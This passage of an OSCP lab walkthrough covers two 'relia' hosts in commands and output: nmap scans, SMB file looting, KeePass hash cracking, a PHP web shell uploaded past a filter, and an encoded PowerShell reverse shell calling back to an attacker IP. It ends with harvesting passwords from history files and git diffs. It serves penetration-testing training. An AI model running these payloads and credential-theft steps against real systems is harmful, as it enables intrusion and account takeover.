| ms-sql-ntlm-info: 
|   192.168.208.248:49965: 
|     Target_Name: EXTERNAL
|     NetBIOS_Domain_Name: EXTERNAL
|     NetBIOS_Computer_Name: EXTERNAL
|     DNS_Domain_Name: EXTERNAL
|     DNS_Computer_Name: EXTERNAL
|_    Product_Version: 10.0.20348
| ms-sql-info: 
|   192.168.208.248:49965: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 49965
|_ssl-date: 2024-02-14T06:23:18+00:00; +1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-14T06:23:10
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.19 seconds
```

2. Performed directory search with gobuser and dirsearch, found nothing useful. 

3. Found smbshare files. 
```
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ smbclient -L \\\\192.168.194.248\\Users\\
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        transfer        Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.194.248 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

4. After many trial and error, checking one by one, a useful kdbx file is located and downloaded. 
```
smb: \DB-back (1)\New folder\Emma\Documents\> ls
  .                                   D        0  Fri Oct 21 04:47:41 2022
  ..                                  D        0  Thu Oct 13 13:19:09 2022
  Database.kdbx                       A     2990  Fri Oct 21 04:47:41 2022

                5864959 blocks of size 4096. 1960123 blocks available
smb: \DB-back (1)\New folder\Emma\Documents\> get Database.kdbx
getting file \DB-back (1)\New folder\Emma\Documents\Database.kdbx of size 2990 as Database.kdbx (2.2 KiloBytes/sec) (average 2.2 KiloBytes/sec)
smb: \DB-back (1)\New folder\Emma\Documents\> zsh: killed     smbclient \\\\192.168.194.248\\transfer
```

5. Cracked database.kdbx using hashcat
```
──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ keepass2john Database.kdbx > keepass.hash


┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ cat keepass.hash 
$keepass$*2*60000*0*682a0e535986c0ab7f02ef294ddfdf869d39bf9e29e17a2d521eb0cdcbd744c0*3d7849d98a8eae59f70b27b1eba401db19dbbae8c095b8be52ef08ffd05a747a*c56d10e5ace50d5924d4b6a9781af20a*947c768ced6729f3741485b9f6ee0737ad70e11933ebdb727c627fe5bc66491a*55de9df220b1d816eb6bad76da248c383a8fde3dbfb2d77e3bb50a25b5ef6133


┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force


$keepass$*2*60000*0*682a0e535986c0ab7f02ef294ddfdf869d39bf9e29e17a2d521eb0cdcbd744c0*3d7849d98a8eae59f70b27b1eba401db19dbbae8c095b8be52ef08ffd05a747a*c56d10e5ace50d5924d4b6a9781af20a*947c768ced6729f3741485b9f6ee0737ad70e11933ebdb727c627fe5bc66491a*55de9df220b1d816eb6bad76da248c383a8fde3dbfb2d77e3bb50a25b5ef6133:welcome1

```

6. Open database.kdbx with kpcli in kali
```
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ kpcli --kdb=Database.kdbx               
Provide the master password: welcome1

kpcli:/Database/Windows> show -f 0

 Path: /Database/Windows/
Title: emma
Uname: emma
 Pass: SomersetVinyl1!
  URL: 
```

7. Started rdp connection with emma creds. Obtained local.txt
```
 xfreerdp /u:emma /p:SomersetVinyl1! /d:relia.com /v:192.168.194.248

3209ee0b4a374685e4cabbba01091d39
```

8. Run winpeas
```
iwr -Uri http://192.168.45.242/winPEASx64.exe -Outfile winPEASx64.exe


.\winPEASx64.exe
```

9. Found out Appkey which was password for mark in env section. Also tried betamonitor dll hijacking but was not possible. 
```
←[1;37m    CLIENT←[0m←[1;31mNAME←[0m: ←[0mkali
←[1;37m    OS: ←[0mWindows_NT
←[1;37m    AppKey: ←[0m!8@aBRBYdb3!
```

10. Rdp login with mark and obtained proof in desktop
```
sudo xfreerdp /cert-ignore /u:mark /p:\!8@aBRBYdb3\! /v:192.168.194.248

de2f4bbd36eb85943ba6f5c27b00a7e7
```


## 249
1. Rustscan and Nmap scans
```
rustscan 192.168.208.249

PORT      STATE SERVICE      REASON
80/tcp    open  http          syn-ack
135/tcp   open  msrpc         syn-ack
139/tcp   open  netbios-ssn   syn-ack
445/tcp   open  microsoft-ds  syn-ack
3389/tcp  open  ms-wbt-server syn-ack
5985/tcp  open  wsman         syn-ack
8000/tcp  open  http-alt      syn-ack
47001/tcp open  winrm         syn-ack
49664/tcp open  unknown       syn-ack
49665/tcp open  unknown       syn-ack
49666/tcp open  unknown       syn-ack
49667/tcp open  unknown       syn-ack
49668/tcp open  unknown       syn-ack
49669/tcp open  unknown       syn-ack


┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ nmap -p$(cat 189-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.194.249  

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-15 22:05 EST
Nmap scan report for 192.168.194.249
Host is up (0.30s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=LEGACY
| Not valid before: 2024-01-13T23:01:30
|_Not valid after:  2024-07-14T23:01:30
|_ssl-date: 2024-02-16T03:07:14+00:00; +1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp  open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.30)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.194.249:8000/dashboard/
|_http-open-proxy: Proxy might be redirecting requests
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2024-02-16T03:07:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.10 seconds
```

2. Found a xampp webpage at port 8000. Start looking of sub directories
```
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ gobuster dir -u http://192.168.194.249:8000/ -w /usr/share/wordlists/dirb/common.txt
/cgi-bin/             (Status: 403) [Size: 307]
/CMS                  (Status: 301) [Size: 348] [--> http://192.168.194.249:8000/CMS/]  


┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ python3 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://192.168.194.249:8000/
```

3. Found a ricecms, again looked of sub directories then found login page. 
```
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ dirb http://192.168.194.249:8000/cms/

http://192.168.194.249:8000/cms/admin.php 
```

4. Delete .htaccess from both files and media and upload simple-backdoor.pHp (.php is not accepted) file and establish a reverse shell with nc listenere. Payload generated with [Online - Reverse Shell Generator (revshells.com)](https://www.revshells.com/)
```
http://192.168.194.249:8000/cms/media/simple-backdoor.pHP?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAAyACIALAA4ADAAOQAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA%3D%3D

┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ sudo nc -nvlp 8090
sudo: unable to resolve host kali: Name or service not known
[sudo] password for kali: 
listening on [any] 8090 ...
connect to [192.168.45.242] from (UNKNOWN) [192.168.194.249] 51762
whoami
legacy\adrian
PS C:\xampp\htdocs\cms\media>
```

5. Obtained local.txt
```
PS C:\Users\adrian\Desktop> cat local.txt
6b6fe74ee1deedea7ce6e80260412365
```

6. Enumerate manually all services and found administrator user demon creds on history file. 
```
PS C:\Users\adrian> (Get-PSReadlineOption).HistorySavePath
C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
PS C:\Users\adrian> type C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
ipconfig
hostname
echo "Let's check if this script works running as damon and password i6yuT6tym@"
echo "Don't forget to clear history once done to remove the password!"
Enter-PSSession -ComputerName LEGACY -Credential $credshutdown /s
```

7. Rdp connection with demon user
```
ali㉿kali)-[~/OSCP/labs/relia]
└─$ xfreerdp /cert-ignore /u:damon /p:'i6yuT6tym@' /v:192.168.194.249
```

8. Proof located in desktop.

9. Post exploitation: Get emails for 189 machine
```
C:\Users\damon>cd C:\staging

C:\staging>git log
commit 8b430c17c16e6c0515e49c4eafdd129f719fde74 (HEAD -> master)
Author: damian <damian>
Date:   Thu Oct 20 02:07:42 2022 -0700

    Email config not required anymore

commit 967fa71c359fffcbeb7e2b72b27a321612e3ad11
Author: damian <damian>
Date:   Thu Oct 20 02:06:37 2022 -0700

    V1

C:\staging>git diff 967fa71c359fffcbeb7e2b72b27a321612e3ad11
diff --git a/htdocs/cms/data/email.conf.bak b/htdocs/cms/data/email.conf.bak
deleted file mode 100644
index 77e370c..0000000
--- a/htdocs/cms/data/email.conf.bak
+++ /dev/null
@@ -1,5 +0,0 @@
-Email configuration of the CMS
-maildmz@relia.com:DPuBT9tGCBrTbR
-
-If something breaks contact jim@relia.com as he is responsible for the mail server.
-Please don't send any office or executable attachments as they get filtered out for security reasons.
\ No newline at end of file

```
## 250
